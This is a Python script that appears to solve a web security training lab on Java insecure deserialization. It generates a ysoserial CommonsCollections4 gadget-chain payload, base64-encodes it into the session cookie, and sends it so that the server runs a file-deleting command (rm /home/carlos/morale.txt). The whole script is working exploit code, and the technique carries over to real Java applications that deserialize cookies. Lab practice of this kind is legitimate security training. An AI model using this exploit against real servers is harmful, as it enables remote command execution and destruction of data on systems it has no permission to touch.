import sys
import os
import subprocess
import base64
from urllib.parse import quote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

ysoserial_path = os.path.join(os.path.dirname(__file__), "../../ysoserial-all.jar")

# generate the serialized Java object using ysoserial
# CommonsCollections4 targets Apache Commons Collections 4.x on the classpath
# the gadget chain executes our OS command during deserialization
command = "rm /home/carlos/morale.txt"
lab.info(f"Generating payload: {command}")

# Java 16+ needs --add-opens flags to let ysoserial access internal modules
result = subprocess.run(
    [
        "java",
        "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
        "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
        "--add-opens", "java.base/java.lang=ALL-UNNAMED",
        "--add-opens", "java.base/java.util=ALL-UNNAMED",
        "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED",
        "--add-opens", "java.base/java.text=ALL-UNNAMED",
        "--add-opens", "java.base/sun.reflect.annotation=ALL-UNNAMED",
        "--add-opens", "java.base/java.io=ALL-UNNAMED",
        "--add-opens", "java.base/java.math=ALL-UNNAMED",
        "--add-opens", "java.base/java.net=ALL-UNNAMED",
        "--add-opens", "java.desktop/java.awt=ALL-UNNAMED",
        "-jar", ysoserial_path,
        "CommonsCollections4", command,
    ],
    capture_output=True,
)

if result.returncode != 0:
    lab.fail(f"ysoserial failed: {result.stderr.decode()}")

# base64-encode the raw serialized bytes for the cookie
payload = base64.b64encode(result.stdout).decode()
lab.info(f"Payload length: {len(payload)} chars")

# replace the session cookie with our URL-encoded malicious payload
lab.session.cookies.set("session", quote(payload))

# send a request - the server deserializes the cookie, triggering the gadget chain
# the 500 error is expected since the object isn't a valid session
resp = lab.get("/")
lab.info(f"Response: {resp.status_code}")

lab.check_solved()
